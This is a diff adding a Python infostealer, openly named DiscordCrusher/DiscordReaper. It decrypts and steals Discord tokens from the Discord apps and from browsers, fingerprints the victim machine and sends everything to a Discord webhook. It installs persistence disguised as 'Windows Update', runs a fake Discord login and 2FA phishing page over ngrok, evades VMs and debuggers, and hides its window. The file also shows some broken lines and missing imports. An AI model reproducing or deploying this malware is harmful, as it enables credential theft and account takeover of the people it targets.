@@ -1,0 +1,588 @@
+import os
+import re
+import sys
+import time
+import json
+import base64
+import sqlite3
+import ctypes
+import shutil
+import random
+import string
+import platform
+import subprocess
+from datetime import datetime
+from urllib import request
+from Crypto.Cipher import AES
+import win32crypt  # Requires pywin32
+import requests
+
+
+WEBHOOK = "https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
+NGROK_AUTH = "YOUR_NGROK_AUTH"  # Optional for phishing server
+USE_NGROK = False
+ENABLE_PERSISTENCE = True
+ENABLE_ANTI_VM = True
+ENABLE_ANTI_DEBUG = True
+KILL_REAL_DISCORD = True
+MAX_TOKENS_TO_SEND = 5
+
+
+class DiscordCrusher:
+    def __init__(self):
+        self.system_data = {}
+        self.tokens = []
+        self.password = None
+        self.email = None
+        self.auth_code = None
+        self.webhook_url = WEBHOOK
+        self.ngrok_url = ""
+
+    def collect_system_info(self):
+        """Gather all possible system fingerprints"""
+        info = {}
+        try:
+            info['hostname'] = os.environ.get('COMPUTERNAME', 'UNKNOWN')
+            info['username'] = os.environ.get('USERNAME', 'UNKNOWN')
+            info['os'] = platform.platform()
+            info['architecture'] = platform.machine()
+            info['processor'] = platform.processor()
+            info['cpu_count'] = os.cpu_count()
+            info['ram'] = str(round(psutil.virtual_memory().total / (1024**3), 2)) + " GB" if 'psutil' in sys.modules else "N/A"
+            info['ip'] = self.get_public_ip()
+            info['hwid'] = self.get_hwid()
+            info['mac'] = self.get_mac_address()
+            info['time'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            info['timezone'] = time.tzname[0]
+            info['screen_resolution'] = f"{ctypes.windll.user32.GetSystemMetrics(0)}x{ctypes.windll.user32.GetSystemMetrics(1)}"
+            info['disk_usage'] = self.get_disk_usage()
+            info['installed_antivirus'] = self.get_antivirus()
+            info['is_admin'] = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        except Exception as e:
+            info['error'] = str(e)
+        self.system_data = info
+        return info
+
+    def get_public_ip(self):
+        try:
+            return request.urlopen('https://api.ipify.org', timeout=5).read().decode()
+        except:
+            return "N/A"
+
+    def get_hwid(self):
+        try:
+            cmd = 'wmic csproduct get uuid'
+            result = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
+            return result.split('\n')[1].strip()
+        except:
+            return "N/A"
+
+    def get_mac_address(self):
+        try:
+            mac = subprocess.check_output('getmac /fo csv /nh', shell=True, stderr=subprocess.DEVNULL).decode()
+            return mac.split(',')[0].strip('"')
+        except:
+            return "N/A"
+
+    def get_disk_usage(self):
+        try:
+            total, used, free = shutil.disk_usage("C:\\")
+            return f"Total: {total//(2**30)}GB, Used: {used//(2**30)}GB, Free: {free//(2**30)}GB"
+        except:
+            return "N/A"
+
+    def get_antivirus(self):
+        try:
+            av_list = []
+            key_path = r"SOFTWARE\Microsoft\Windows Defender\Exclusions"
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ) as key:
+                av_list.append("Windows Defender")
+            av_paths = [
+                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
+                r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
+            ]
+            av_keywords = ["norton", "mcafee", "kaspersky", "avast", "bitdefender", "avg", "eset", "sophos", "trend micro"]
+            for path in av_paths:
+                try:
+                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_READ) as key:
+                        i = 0
+                        while True:
+                            try:
+                                subkey_name = winreg.EnumKey(key, i)
+                                with winreg.OpenKey(key, subkey_name) as subkey:
+                                    try:
+                                        display_name = winreg.QueryValueEx(subkey, "DisplayName")[0]
+                                        if any(av in display_name.lower() for av in av_keywords):
+                                            av_list.append(display_name)
+                                    except:
+                                        pass
+                                i += 1
+                            except WindowsError:
+                                break
+                except:
+                    pass
+            return ', '.join(list(set(av_list))) if av_list else "None Detected"
+        except:
+            return "N/A"
+
+    def extract_tokens(self):
+        """Extract Discord tokens from all known locations with proper decryption"""
+        tokens = []
+        discord_apps = [
+            (os.getenv('APPDATA') + '\\Discord', 'Discord'),
+            (os.getenv('APPDATA') + '\\DiscordCanary', 'Discord Canary'),
+            (os.getenv('APPDATA') + '\\DiscordPTB', 'Discord PTB'),
+            (os.getenv('APPDATA') + '\\discorddevelopment', 'Discord Development'),
+        ]
+        
+        browsers = [
+            (os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data\\Default', 'Chrome'),
+            (os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge\\User Data\\Default', 'Edge'),
+            (os.getenv('LOCALAPPDATA') + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 'Brave'),
+            (os.getenv('LOCALAPPDATA') + '\\Opera Software\\Opera Stable', 'Opera'),
+        ]
+
+       
+        for path, name in discord_apps:
+            if not os.path.exists(path):
+                continue
+                
+          
+            local_state = os.path.join(path, 'Local State')
+            if not os.path.exists(local_state):
+                continue
+                
+            try:
+                with open(local_state, 'r') as f:
+                    state = json.load(f)
+                encrypted_key = base64.b64decode(state['os_crypt']['encrypted_key'])
+                encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
+                master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            except:
+                continue
+
+            
+            leveldb_path = os.path.join(path, 'Local Storage', 'leveldb')
+            if not os.path.exists(leveldb_path):
+                continue
+                
+            for file in os.listdir(leveldb_path):
+                if file.endswith('.ldb'):
+                    file_path = os.path.join(leveldb_path, file)
+                    try:
+                        with open(file_path, 'rb') as f:
+                            data = f.read()
+                        
+                        matches = re.findall(b'gAAAAAB[A-Za-z0-9+/=]+', data)
+                        for match in matches:
+                            try:
+                                encrypted = base64.b64decode(match)
+                                
+                                iv = encrypted[3:15]
+                                payload = encrypted[15:-16]
+                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                                decrypted = cipher.decrypt(payload).decode('utf-8')
+                                if re.match(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', decrypted):
+                                    tokens.append(decrypted)
+                            except:
+                                pass
+                    except:
+                        pass
+
+      
+        for path, name in browsers:
+            if not os.path.exists(path):
+                continue
+                
+           
+            local_state = os.path.join(os.path.dirname(path), 'Local State')
+            if not os.path.exists(local_state):
+                continue
+                
+            try:
+                with open(local_state, 'r') as f:
+                    state = json.load(f)
+                encrypted_key = base64.b64decode(state['os_crypt']['encrypted_key'])
+                encrypted_key = encrypted_key[5:]
+                master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            except:
+                continue
+
+            web_data = os.path.join(path, 'Web Data')
+            if os.path.exists(web_data):
+                try:
+                    conn = sqlite3.connect(web_data)
+                    cursor = conn.cursor()
+                    cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
+                    tables = cursor.fetchall()
+                    
+                    for table in tables:
+                        try:
+                            cursor.execute(f"SELECT * FROM {table[0]} LIMIT 1000")
+                            rows = cursor.fetchall()
+                            for row in rows:
+                                for col in row:
+                                    if isinstance(col, str) and re.match(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', col):
+                                        tokens.append(col)
+                                    elif isinstance(col, bytes):
+                                        try:
+                                            decrypted = self.decrypt_browser_data(col, master_key)
+                                            if decrypted and re.match(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', decrypted):
+                                                tokens.append(decrypted)
+                                        except:
+                                            pass
+                        except:
+                            continue
+                    conn.close()
+                except:
+                    pass
+
+       
+        try:
+            ps_script = """
+            Get-Process -Name Discord*, chrome*, edge*, brave*, opera* | ForEach-Object {
+                $modules = $_.Modules
+                foreach ($mod in $modules) {
+                    if ($mod.ModuleName -match 'token') {
+                        Write-Output $mod.BaseAddress
+                    }
+                }
+            }
+            """
+            result = subprocess.check_output(['powershell', '-Command', ps_script], stderr=subprocess.DEVNULL, timeout=5)
+           
+        except:
+            pass
+
+        self.tokens = list(set(tokens))
+        return self.tokens
+
+    def decrypt_browser_data(self, data, key):
+        """Decrypt browser-encrypted data using AES-GCM"""
+        try:
+            if len(data) < 15:
+                return None
+            iv = data[3:15]
+            payload = data[15:-16] if len(data) > 15 else data[15:]
+            if len(payload) == 0:
+                return None
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            decrypted = cipher.decrypt(payload)
+            return decrypted.decode('utf-8', errors='ignore')
+        except:
+            return None
+
+
+    def send_to_webhook(self, data, retries=3):
+        """Send data to Discord webhook with retry logic"""
+        if not self.webhook_url or 'YOUR_' in self.webhook_url:
+            return False
+
+        payload = {
+            "username": "DiscordReaper",
+            "avatar_url": "https://i.imgur.com/your_avatar.png",
+            "embeds": [{
+                "title": "🎯 NEW VICTIM ACQUIRED 🎯",
+                "color": 0x00ff00 if data.get('type') == 'success' else 0xff0000,
+                "thumbnail": {"url": "https://i.imgur.com/your_icon.png"},
+                "fields": [
+                    {"name": "🖥️ System", "value": f"```\nHostname: {self.system_data.get('hostname', 'N/A')}\nUser: {self.system_data.get('username', 'N/A')}\nIP: {self.system_data.get('ip', 'N/A')}\nHWID: {self.system_data.get('hwid', 'N/A')}```", "inline": False},
+                    {"name": "🔑 Credentials", "value": f"```\nEmail: {data.get('email', 'N/A')}\nPassword: {data.get('password', 'N/A')}\n2FA: {data.get('auth_code', 'N/A')}```", "inline": False},
+                    {"name": "🎟️ Tokens", "value": f"```\n{chr(10).join(self.tokens[:MAX_TOKENS_TO_SEND]) if self.tokens else 'No tokens found'}```", "inline": False},
+                    {"name": "📊 Additional Info", "value": f"```\nOS: {self.system_data.get('os', 'N/A')}\nAdmin: {self.system_data.get('is_admin', 'N/A')}\nAV: {self.system_data.get('installed_antivirus', 'N/A')}```", "inline": False}
+                ],
+                "timestamp": datetime.utcnow().isoformat()
+            }]
+        }
+
+        for attempt in range(retries):
+            try:
+                response = requests.post(self.webhook_url, json=payload, timeout=10)
+                if response.status_code in (200, 204):
+                    return True
+                elif response.status_code == 429:  # Rate limited
+                    time.sleep(int(response.headers.get('Retry-After', 5)))
+                    continue
+                else:
+                    time.sleep(2 * (attempt + 1))
+            except:
+                time.sleep(2 * (attempt + 1))
+        return False
+
+    def install_persistence(self):
+        """Multiple persistence methods"""
+        if not ENABLE_PERSISTENCE:
+            return False
+
+        methods = []
+        exe_path = os.path.abspath(sys.argv[0])
+
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, exe_path)
+            winreg.CloseKey(key)
+            methods.append("Registry Run")
+        except:
+            pass
+
+  
+        try:
+            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            shortcut_path = os.path.join(startup_folder, 'WindowsUpdate.lnk')
+            # Create shortcut using powershell
+            ps_script = f"""
+            $WScriptShell = New-Object -ComObject WScript.Shell
+            $Shortcut = $WScriptShell.CreateShortcut('{shortcut_path}')
+            $Shortcut.TargetPath = '{exe_path}'
+            $Shortcut.WorkingDirectory = '{os.path.dirname(exe_path)}'
+            $Shortcut.Save()
+            """
+            subprocess.run(['powershell', '-Command', ps_script], capture_output=True, timeout=5)
+            methods.append("Startup Folder")
+        except:
+            pass
+
+
+        try:
+            task_name = "WindowsUpdateTask"
+            cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /f /rl highest'
+            subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
+            methods.append("Scheduled Task")
+        except:
+            pass
+
+        return methods
+
+
+    def start_phishing_server(self):
+        """Start Flask server for credential harvesting"""
+        if not USE_NGROK:
+            return None
+
+        try:
+            from flask import Flask, request, render_template_string, redirect
+
+            app = Flask(__name__)
+
+            @app.route('/')
+            def index():
+                return render_template_string("""
+                <!DOCTYPE html>
+                <html>
+                <head><title>Discord Verification</title>
+                <style>body{background:#36393f;color:#fff;font-family:Arial;}.container{width:400px;margin:100px auto;background:#2f3136;padding:20px;border-radius:5px;}input{width:100%;padding:10px;margin:10px 0;border:none;border-radius:3px;}button{background:#5865F2;color:white;border:none;padding:10px;width:100%;border-radius:3px;cursor:pointer;}</style>
+                </head>
+                <body>
+                <div class="container">
+                <h2>Security Verification Required</h2>
+                <form method="POST" action="/login">
+                <input type="email" name="email" placeholder="Email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Verify Account</button>
+                </form>
+                </div>
+                </body>
+                </html>
+                """)
+
+            @app.route('/login', methods=['POST'])
+            def login():
+                self.email = request.form.get('email', '')
+                self.password = request.form.get('password', '')
+                data = {'email': self.email, 'password': self.password, 'type': 'credentials'}
+                self.send_to_webhook(data)
+                return redirect('/2fa')
+
+            @app.route('/2fa')
+            def twofa():
+                return render_template_string("""
+                <!DOCTYPE html>
+                <html>
+                <head><title>2FA Required</title>
+                <style>body{background:#36393f;color:#fff;font-family:Arial;}.container{width:400px;margin:100px auto;background:#2f3136;padding:20px;border-radius:5px;}input{width:100%;padding:10px;margin:10px 0;border:none;border-radius:3px;}button{background:#5865F2;color:white;border:none;padding:10px;width:100%;border-radius:3px;cursor:pointer;}</style>
+                </head>
+                <body>
+                <div class="container">
+                <h2>Two-Factor Authentication</h2>
+                <p>Enter your 6-digit authentication code</p>
+                <form method="POST" action="/verify">
+                <input type="text" name="auth_code" placeholder="6-digit code" required>
+                <button type="submit">Verify</button>
+                </form>
+                </div>
+                </body>
+                </html>
+                """)
+
+            @app.route('/verify', methods=['POST'])
+            def verify():
+                self.auth_code = request.form.get('auth_code', '')
+                data = {'auth_code': self.auth_code, 'type': '2fa'}
+                self.send_to_webhook(data)
+                return redirect('https://discord.com/login?error=invalid_credentials')
+
+            
+            import threading
+            thread = threading.Thread(target=app.run, kwargs={'host': '0.0.0.0', 'port': 5000, 'debug': False, 'use_reloader': False})
+            thread.daemon = True
+            thread.start()
+
+            self.start_ngrok()
+            return self.ngrok_url
+        except:
+            return None
+
+    def start_ngrok(self):
+        """Start ngrok tunnel"""
+        try:
+            
+            ngrok_path = os.path.join(os.getenv('TEMP'), 'ngrok.exe')
+            if not os.path.exists(ngrok_path):
+                ngrok_url = "https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip"
+                zip_path = ngrok_path + '.zip'
+                request.urlretrieve(ngrok_url, zip_path)
+                import zipfile
+                with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+                    zip_ref.extractall(os.getenv('TEMP'))
+                os.remove(zip_path)
+
+           
+            subprocess.Popen([ngrok_path, 'http', '5000', '--authtoken', NGROK_AUTH], 
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            
+            
+            time.sleep(3)
+            response = request.urlopen('http://localhost:4040/api/tunnels')
+            data = json.loads(response.read().decode())
+            self.ngrok_url = data['tunnels'][0]['public_url']
+            return self.ngrok_url
+        except:
+            return None
+
+
+    def anti_analysis(self):
+        """Evade analysis and debugging"""
+        if ENABLE_ANTI_VM:
+            # Check for VM processes
+            vm_processes = ['vmtoolsd.exe', 'vmwaretrat.exe', 'vboxservice.exe', 'xenservice.exe']
+            for proc in vm_processes:
+                try:
+                    output = subprocess.check_output(f'tasklist /fi "imagename eq {proc}"', shell=True, stderr=subprocess.DEVNULL)
+                    if proc in output.decode():
+                        sys.exit(0)
+                except:
+                    pass
+
+
+            vm_files = ['C:\\Program Files\\VMware\\', 'C:\\Program Files\\VirtualBox\\']
+            for path in vm_files:
+                if os.path.exists(path):
+                    sys.exit(0)
+
+            try:
+                mac = self.get_mac_address()
+                vm_macs = ['00:05:69', '00:0C:29', '00:50:56', '08:00:27']
+                if any(mac.startswith(vm_mac) for vm_mac in vm_macs):
+                    sys.exit(0)
+            except:
+                pass
+
+        if ENABLE_ANTI_DEBUG:
+            # Check for debugger
+            if ctypes.windll.kernel32.IsDebuggerPresent() != 0:
+                # Try to crash the debugger
+                ctypes.windll.kernel32.DebugBreak()
+                sys.exit(0)
+
+            analysis_tools = ['wireshark.exe', 'procmon.exe', 'processhacker.exe', 'dnspy.exe', 'de4dot.exe']
+            for tool in analysis_tools:
+                try:
+                    output = subprocess.check_output(f'tasklist /fi "imagename eq {tool}"', shell=True, stderr=subprocess.DEVNULL)
+                    if tool in output.decode():
+                        sys.exit(0)
+                except:
+                    pass
+
+
+            sandbox_files = ['C:\\sample.exe', 'C:\\sandbox']
+            for path in sandbox_files:
+                if os.path.exists(path):
+                    sys.exit(0)
+
+            try:
+                import psutil
+                if psutil.virtual_memory().total < 2 * 1024**3:  # < 2GB
+                    sys.exit(0)
+            except:
+                pass
+
+
+    def run(self):
+        """Main execution flow"""
+        try:
+s
+            self.anti_analysis()
+
+            self.collect_system_info()
+
+            self.extract_tokens()
+
+            if ENABLE_PERSISTENCE:
+                self.install_persistence()
+
+
+            if KILL_REAL_DISCORD:
+                try:
+                    subprocess.run('taskkill /f /im discord.exe /im discordptb.exe /im discordcanary.exe', 
+                                 shell=True, capture_output=True)
+                except:
+                    pass
+
+
+            data = {'type': 'initial', 'email': 'N/A', 'password': 'N/A', 'auth_code': 'N/A'}
+            self.send_to_webhook(data)
+
+      )
+            if USE_NGROK:
+                self.start_phishing_server()
+
+            while True:
+
+                time.sleep(3600) 
+                new_tokens = self.extract_tokens()
+                if new_tokens and new_tokens != self.tokens:
+                    self.tokens = new_tokens
+                    data = {'type': 'new_tokens', 'email': 'N/A', 'password': 'N/A', 'auth_code': 'N/A'}
+                    self.send_to_webhook(data)
+
+        except Exception as e:
+
+            pass
+
+
+    @staticmethod
+    def create_mutex(name="Global\\DiscordReaperMutex"):
+        try:
+            import win32event
+            mutex = win32event.CreateMutex(None, False, name)
+            if win32event.GetLastError() == win32event.ERROR_ALREADY_EXISTS:
+                sys.exit(0)
+            return mutex
+        except:
+            return None
+
+
+if __name__ == "__main__":
+
+    ctypes.windll.kernel32.SetConsoleTitleW("Windows Update Service")
+    if sys.platform == 'win32':
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+
+
+    try:
+        crusher = DiscordCrusher()
+        crusher.run()
+    except KeyboardInterrupt:
+        pass
+    except:
+        pass
